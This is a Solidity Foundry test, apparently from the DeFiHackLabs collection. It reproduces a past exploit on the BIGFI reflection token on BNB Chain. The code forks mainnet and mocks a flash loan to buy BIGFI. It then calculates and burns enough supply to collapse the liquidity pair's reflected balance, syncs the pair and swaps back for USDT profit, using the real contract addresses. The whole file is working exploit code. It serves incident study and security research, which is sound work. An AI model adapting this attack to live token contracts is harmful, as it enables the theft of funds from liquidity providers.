// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @TX
// https://bscscan.com/tx/0x9fe19093a62a7037d04617b3ac4fbf5cb2d75d8cb6057e7e1b3c75cbbd5a5adc
// Related Events
// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230207---fdp---reflection-token
// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230126---tinu---reflection-token
// https://github.com/SunWeb3Sec/DeFiHackLabs#20230210---sheep---reflection-token

interface RDeflationERC20 is IERC20 {
    function burn(uint256 amount) external;
}

interface ISwapFlashLoan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes memory params
    ) external;
}

contract ContractTest is Test {
    RDeflationERC20 BIGFI =
        RDeflationERC20(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA269556EdC45581F355742e46D2d722c5F3f551a);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 flashloanAmount = 200_000 * 1e18;
    uint256 paybackAmount = flashloanAmount * 1003 / 1000;

    function setUp() public {
        cheats.createSelectFork("bsc", 26685503);
        cheats.label(address(BIGFI), "BIGFI");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker USDT balance",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker BIGFI balance",
            BIGFI.balanceOf(address(this)),
            BIGFI.decimals()
        );
        emit log_string("");
    }

    function testExploit() external {
        print("Before exploit: ");
        // prepareAction is inferred by AFG
        prepareAction();

        // exploitAction is inferred by SSG
        exploitAction();

        // postAction is inferred by AFG
        postAction();
        print("After exploit: ");
    }

    // prepareAction is inferred by AFG
    function prepareAction() internal {
        // Step 1, mock to flashloan USDT
        deal(address(USDT), address(this), flashloanAmount);

        // Step 2, approve
        USDT.approve(address(Router), type(uint256).max);

        // Step 3, swap USDT to get BIGFI
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(BIGFI);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function exploitAction() internal {
        // BIGFI is a reflakeToken. So we need to calculate the number of burned tokens carefully.
        // Before the exploit: balanceOf(Pair) = (_rOwned(Pair) * _tTotal / _rTotal)
        // To make: balanceOf(Pair)' = n = (_rOwned(Pair) * _tTotal' / _rTotal)
        // _tTotal' = n * _rTotal / _rOwned(Pair)
        // burnAmount = _tTotal - _tTotal' = _tTotal - n * _rTotal / _rOwned(Pair) = _tTotal - (n * _tTotal / balanceOf(Pair))
        // Here, 2 is the smallest n which will not cause a revert
        uint256 t = BIGFI.totalSupply();
        uint256 burnDiff = (2 * t) / BIGFI.balanceOf(address(Pair));
        uint256 burnAmount = t - burnDiff;

        emit log_uint(burnAmount);

        // Step 4
        BIGFI.burn(burnAmount);

        // Step 5
        Pair.sync();
    }

    function postAction() internal {
        // Step 6, approve
        BIGFI.approve(address(Router), type(uint256).max);

        // Step 7
        address[] memory path = new address[](2);
        path[0] = address(BIGFI);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BIGFI.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        // Step 8, mock to payback flashloan
        USDT.transfer(address(0xdead), paybackAmount);
    }
}
